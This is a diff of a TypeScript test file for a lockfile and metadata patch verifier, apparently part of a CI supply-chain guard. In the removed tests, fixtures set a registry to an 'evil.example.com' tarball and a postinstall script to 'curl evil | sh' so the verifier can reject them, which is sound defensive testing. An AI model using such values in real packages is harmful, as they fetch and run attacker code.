@@ -2,20 +2,17 @@ import { describe, expect, test } from "bun:test";
 import { readFileSync } from "node:fs";
 import type { PrDiffEntry } from "../../f/factory/lib/metadata_patch_verify.ts";
 import {
-  buildLock,
-  INTEGRITY,
-  OTHER_INTEGRITY,
-} from "./metadata_patch_fixtures.ts";
-import {
+  addExistingScript,
   BASE,
   BASE_TIP,
   codeOf,
+  EMPTY_LOCK,
   encoder,
   HASH_NEW,
   HASH_OLD,
   HEAD,
-  NEW_LOCK,
-  OLD_LOCK,
+  LOCK,
+  STALE_LOCK,
   scriptYaml,
   verify,
   wmillLock,
@@ -23,7 +20,7 @@ import {
 } from "./metadata_patch_verify_world.ts";
 
 describe("verifyMetadataPatch accepts a correct patch", () => {
-  test("accepts a patch for an importer of a changed file", async () => {
+  test("accepts a patch for a changed script", async () => {
     expect(await codeOf(world())).toBe("ok");
   });
 
@@ -41,20 +38,7 @@ describe("verifyMetadataPatch accepts a correct patch", () => {
     const lock = result.ok
       ? result.writes.find((w) => w.path === "f/factory/foo.script.lock")
       : undefined;
-    expect(new TextDecoder().decode(lock?.content)).toBe(NEW_LOCK);
-  });
-
-  test("lists the changes of the dependencies", async () => {
-    const result = await verify(world());
-    expect(result.ok && result.dependencyChanges).toEqual([
-      {
-        script: "f/factory/foo",
-        name: "left-pad",
-        from: "1.3.0",
-        to: "1.4.0",
-        integrity: INTEGRITY,
-      },
-    ]);
+    expect(new TextDecoder().decode(lock?.content)).toBe(LOCK);
   });
 
   test("accepts a repository name that differs in case", async () => {
@@ -63,34 +47,33 @@ describe("verifyMetadataPatch accepts a correct patch", () => {
     expect(await codeOf(w)).toBe("ok");
   });
 
-  test("accepts an importer of an importer", async () => {
+  test("accepts the lock of an importer of a changed file", async () => {
     const w = world();
-    w.head.set("f/factory/baz.ts", 'import "./foo.ts";\n');
-    w.patch.set("f/factory/baz.script.lock", OLD_LOCK);
-    w.statuses.set("f/factory/baz.script.lock", "added");
+    addExistingScript(w, "baz", 'import "./foo.ts";\n');
+    w.patch.set("f/factory/baz.script.lock", LOCK);
     expect(await codeOf(w)).toBe("ok");
   });
 
-  test("accepts an importer written with a multi-line import", async () => {
+  test("accepts the lock of an importer written with a multi-line import", async () => {
     const w = world();
-    w.head.set(
-      "f/factory/baz.ts",
+    addExistingScript(
+      w,
+      "baz",
       'import {\n  a,\n  b,\n} from "./lib/bar.ts";\n',
     );
-    w.patch.set("f/factory/baz.script.lock", EMPTY_LOCK);
-    w.statuses.set("f/factory/baz.script.lock", "added");
+    w.patch.set("f/factory/baz.script.lock", LOCK);
     expect(await codeOf(w)).toBe("ok");
   });
 
-  test("accepts a new script whose source the PR added", async () => {
+  test("accepts a new script that has no dependency", async () => {
     const w = world();
-    w.head.set("f/factory/newone.ts", 'import pad from "left-pad@1.3.0";\n');
+    w.head.set("f/factory/newone.ts", "export function main() {}\n");
     w.pr = {
       ...w.pr,
       diff: [{ path: "f/factory/newone.ts", status: "added" }],
     };
     w.patch = new Map<string, string | Uint8Array>([
-      ["f/factory/newone.script.lock", OLD_LOCK],
+      ["f/factory/newone.script.lock", EMPTY_LOCK],
       ["f/factory/newone.script.yaml", scriptYaml("newone")],
       [
         "wmill-lock.yaml",
@@ -103,14 +86,9 @@ describe("verifyMetadataPatch accepts a correct patch", () => {
     ]);
     w.statuses.set("f/factory/newone.script.lock", "added");
     w.statuses.set("f/factory/newone.script.yaml", "added");
-    w.base = new Map();
-    w.age = () => 30;
     expect(await codeOf(w)).toBe("ok");
   });
 });
-
-const WMILL_IMPORT = 'import * as wmill from "windmill-client@1.817.0";\n';
-const EMPTY_LOCK = '{\n  "dependencies": {}\n}\n//bun.lock\n<empty>';
 
 describe("verifyMetadataPatch with the committed files", () => {
   test("accepts a patch made of the committed lock, schema and hashes", async () => {
@@ -119,8 +97,8 @@ describe("verifyMetadataPatch with the committed files", () => {
     const hashes = readFileSync("wmill-lock.yaml", "utf8");
     const w = world();
     w.head = new Map<string, string | Uint8Array>([
-      ["f/factory/approval_decide.ts", WMILL_IMPORT],
-      ["f/factory/approval_decide.script.lock", lock],
+      ["f/factory/approval_decide.ts", "export function main() {}\n"],
+      ["f/factory/approval_decide.script.lock", STALE_LOCK],
       [
         "f/factory/approval_decide.script.yaml",
         yaml.replace("type: object", "type: string"),
@@ -131,7 +109,7 @@ describe("verifyMetadataPatch with the committed files", () => {
       ],
     ]);
     w.base = new Map<string, string | Uint8Array>([
-      ["f/factory/approval_decide.ts", WMILL_IMPORT],
+      ["f/factory/approval_decide.ts", "export function main() {}\n"],
       ["f/factory/approval_decide.script.lock", lock],
     ]);
     w.pr = {
@@ -237,6 +215,12 @@ describe("verifyMetadataPatch checks where the run comes from", () => {
       expect(await codeOf(w)).toBe("ok");
     },
   );
+
+  test("rejects a diff that GitHub cut short", async () => {
+    const w = world();
+    w.pr = { ...w.pr, diffTruncated: true };
+    expect(await codeOf(w)).toBe("pr_diff_incomplete");
+  });
 });
 
 describe("verifyMetadataPatch checks the manifest and the files", () => {
@@ -281,7 +265,7 @@ describe("verifyMetadataPatch checks the manifest and the files", () => {
   test("rejects a path that differs only in case", async () => {
     const w = world();
     w.head.set("f/factory/Foo.ts", "export const z = 1;\n");
-    w.patch.set("f/factory/Foo.script.lock", OLD_LOCK);
+    w.patch.set("f/factory/Foo.script.lock", LOCK);
     expect(await codeOf(w)).toBe("case_collision");
   });
 
@@ -317,7 +301,7 @@ describe("verifyMetadataPatch checks the manifest and the files", () => {
     w.tamperArchive = (archive) =>
       archive.set(
         "files/f/factory/foo.script.lock",
-        encoder.encode(NEW_LOCK.replace("1.4.0", "1.5.0")),
+        encoder.encode(LOCK.replace("1.3.0", "1.5.0")),
       );
     expect(await codeOf(w)).toBe("digest_mismatch");
   });
@@ -327,7 +311,7 @@ describe("verifyMetadataPatch checks the manifest and the files", () => {
     w.tamperArchive = (archive) =>
       archive.set(
         "files/f/factory/foo.script.lock",
-        encoder.encode(`${NEW_LOCK}\n`),
+        encoder.encode(`${LOCK}\n`),
       );
     expect(await codeOf(w)).toBe("size_mismatch");
   });
@@ -374,8 +358,8 @@ describe("verifyMetadataPatch checks the history", () => {
 describe("verifyMetadataPatch limits which scripts may change", () => {
   test("rejects a script that the PR did not touch", async () => {
     const w = world();
-    w.head.set("f/factory/other.script.lock", OLD_LOCK);
-    w.patch.set("f/factory/other.script.lock", NEW_LOCK);
+    addExistingScript(w, "other2", "export const y = 1;\n");
+    w.patch.set("f/factory/other2.script.lock", LOCK);
     expect(await codeOf(w)).toBe("script_not_affected");
   });
 
@@ -387,16 +371,16 @@ describe("verifyMetadataPatch limits which scripts may change", () => {
 
   test("rejects the lock of a script whose source is protected", async () => {
     const w = world();
-    w.head.set(
-      "f/factory/steps/dependabot_assess.ts",
+    addExistingScript(
+      w,
+      "steps/dependabot_assess",
       'import "../lib/bar.ts";\n',
     );
-    w.patch.set("f/factory/steps/dependabot_assess.script.lock", OLD_LOCK);
-    w.statuses.set("f/factory/steps/dependabot_assess.script.lock", "added");
+    w.patch.set("f/factory/steps/dependabot_assess.script.lock", LOCK);
     expect(await codeOf(w)).toBe("protected_source");
   });
 
-  test("rejects a new script whose source the PR did not add", async () => {
+  test("rejects a new script yaml whose source the PR did not add", async () => {
     const w = world();
     w.patch.set("f/factory/foo2.script.yaml", scriptYaml("foo2"));
     w.statuses.set("f/factory/foo2.script.yaml", "added");
@@ -422,94 +406,7 @@ describe("verifyMetadataPatch limits which scripts may change", () => {
       "f/factory/foo.script.lock",
       new Uint8Array([0xff, 0xfe, 0x00]),
     );
-    expect(await codeOf(w)).toBe("not_text");
-  });
-});
-
-describe("verifyMetadataPatch checks the lock", () => {
-  test("rejects a replaced source of a package", async () => {
-    const w = world();
-    w.patch.set(
-      "f/factory/foo.script.lock",
-      buildLock({
-        deps: { "left-pad": "1.4.0" },
-        packages: {
-          "left-pad": {
-            ident: "left-pad@1.4.0",
-            registry: "https://evil.example.com/x.tgz",
-          },
-        },
-      }),
-    );
-    expect(await codeOf(w)).toBe("lock_invalid");
-  });
-
-  test("rejects a postinstall script", async () => {
-    const w = world();
-    w.patch.set(
-      "f/factory/foo.script.lock",
-      buildLock({
-        front: {
-          scripts: { postinstall: "curl evil | sh" },
-          dependencies: { "left-pad": "1.4.0" },
-        },
-        deps: { "left-pad": "1.4.0" },
-      }),
-    );
-    expect(await codeOf(w)).toBe("lock_invalid");
-  });
-
-  test("rejects a dependency that follows a tag", async () => {
-    const w = world();
-    w.patch.set(
-      "f/factory/foo.script.lock",
-      buildLock({ deps: { "left-pad": "latest" } }),
-    );
-    expect(await codeOf(w)).toBe("lock_invalid");
-  });
-
-  test("rejects the same version with another integrity", async () => {
-    const w = world();
-    w.patch.set(
-      "f/factory/foo.script.lock",
-      buildLock({
-        packages: {
-          "left-pad": { ident: "left-pad@1.3.0", integrity: OTHER_INTEGRITY },
-        },
-      }),
-    );
-    expect(await codeOf(w)).toBe("lock_integrity_changed");
-  });
-
-  test("rejects a version published too recently", async () => {
-    const w = world();
-    w.age = () => 2;
-    expect(await codeOf(w)).toBe("version_too_new");
-  });
-
-  test("accepts a version published exactly on the minimum day", async () => {
-    const w = world();
-    w.age = () => 7;
-    expect(await codeOf(w)).toBe("ok");
-  });
-
-  test("rejects when the registry cannot tell the age", async () => {
-    const w = world();
-    w.age = () => null;
-    expect(await codeOf(w)).toBe("registry_unavailable");
-  });
-
-  test("rejects a base lock that cannot be read", async () => {
-    const w = world();
-    w.base.set("f/factory/foo.script.lock", "not a lock");
-    expect(await codeOf(w)).toBe("base_lock_invalid");
-  });
-
-  test("does not ask the registry for a version that did not change", async () => {
-    const w = world();
-    w.patch.set("f/factory/foo.script.lock", OLD_LOCK);
-    w.age = () => null;
-    expect(await codeOf(w)).toBe("ok");
+    expect(await codeOf(w)).toBe("lock_changed");
   });
 });
 
@@ -601,5 +498,34 @@ describe("verifyMetadataPatch checks the lock hashes", () => {
       }),
     );
     expect(await codeOf(w)).toBe("wmill_lock_invalid");
+  });
+
+  test("rejects a hash for a script whose source is protected", async () => {
+    const w = world();
+    addExistingScript(w, "steps/dependabot_assess", "export const a = 1;\n");
+    w.pr = {
+      ...w.pr,
+      diff: [
+        ...w.pr.diff,
+        { path: "f/factory/steps/dependabot_assess.ts", status: "modified" },
+      ],
+    };
+    w.head.set(
+      "wmill-lock.yaml",
+      wmillLock({
+        "f/factory/foo": HASH_OLD,
+        "f/factory/other": HASH_OLD,
+        "f/factory/steps/dependabot_assess": HASH_OLD,
+      }),
+    );
+    w.patch.set(
+      "wmill-lock.yaml",
+      wmillLock({
+        "f/factory/foo": HASH_NEW,
+        "f/factory/other": HASH_OLD,
+        "f/factory/steps/dependabot_assess": HASH_NEW,
+      }),
+    );
+    expect(await codeOf(w)).toBe("wmill_lock_key_not_allowed");
   });
 });
